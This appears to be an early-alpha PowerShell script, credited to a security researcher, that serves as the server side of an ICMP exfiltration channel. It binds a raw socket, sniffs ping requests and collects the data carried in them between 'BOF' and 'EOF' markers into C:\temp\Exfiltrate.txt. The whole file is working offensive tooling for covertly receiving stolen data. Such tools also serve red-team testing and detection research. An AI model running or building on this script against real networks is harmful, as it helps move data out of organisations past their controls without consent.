#    Powershell-ICMP-Listener
#    ICMP Exfiltration server script
#    Author: Oddvar Moe (@oddvarmoe)
#    License: BSD 3-Clause
#    Required Dependencies: None
#    Optional Dependencies: None
#    Early alpha version

# Script will keep running until a ping packet with BOF is received
# Script will then add the data from the ICMP packet until EOF is received

### NOTES TO MYSELF  ###
#IP packet stops at [20] 
#ICMP starts from [21] - https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol 
#$buffer[9] = Type... 1 = ICMP , 6 = TCP
#$buffer[12]+[13]+[14]+[15] = source IP
#$buffer[16]+[17]+[18]+[19] = destination IP
#$buffer[20] = ICMP Type
#$buffer[28] = DATA portion of ICMP
# Entire packet in HEX: [System.BitConverter]::ToString($buffer[0..1499])

# Inspiration and help
# http://www.drowningintechnicaldebt.com/RoyAshbrook/archive/2013/03/08/how-to-write-a-basic-sniffer-in-powershell.aspx 

# TODO: 
# Need to find a dynamic way to enumerate filename and length
# Gain more speed using different methods - IT IS SLOW NOW
# Convert it to function
# Confirm transfer of each packet
# Only allow specified IP to send data
# Use filename sent from Client script to save on server side

$Outfile = "C:\temp\Exfiltrate.txt"
$IP = "192.168.0.74"

# Initialize socket and bind
$ICMPSocket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
$Address = New-Object system.net.IPEndPoint([system.net.IPAddress]::Parse($IP), 0) 
$ICMPSocket.bind($Address)
$ICMPSocket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
$buffer = new-object byte[] $ICMPSocket.ReceiveBufferSize

# Set Capture to false
$Capture = $false

while($True)
{
        #Only inspect the request packets - type 8
        # Request
        if([System.BitConverter]::ToString($buffer[20]) -eq "08")
        {
            #IF EOF is received in data segment of ICMP the script will exit the loop.
            if([System.Text.Encoding]::ASCII.GetString($buffer[28..30]) -eq "EOF")
            {
                Write-Output "EOF received - transfer complete - Saving file and stopping script"
                #create file 
                [System.Text.Encoding]::ASCII.GetString($Transferbytes) | Out-File $Outfile
                $Capture = $false
                break
            } 
            
            
            if($Capture)
            {
                #Capture filecontent into bytearray"
                [byte[]]$Transferbytes += $buffer[28..1499]
            }
            # Byte 28 = BOF
            if([System.Text.Encoding]::ASCII.GetString($buffer[28..30]) -eq "BOF")
            {
                #BOF MATCH
                Write-Output "BOF received - Starting Capture of file"
                # Need to find a dynamic way to enumerate filename
                $Filename = [System.Text.Encoding]::ASCII.GetString($buffer[31..46])
                $Capture = $true       
            } 
        }
        $null = $ICMPSocket.Receive($buffer)
}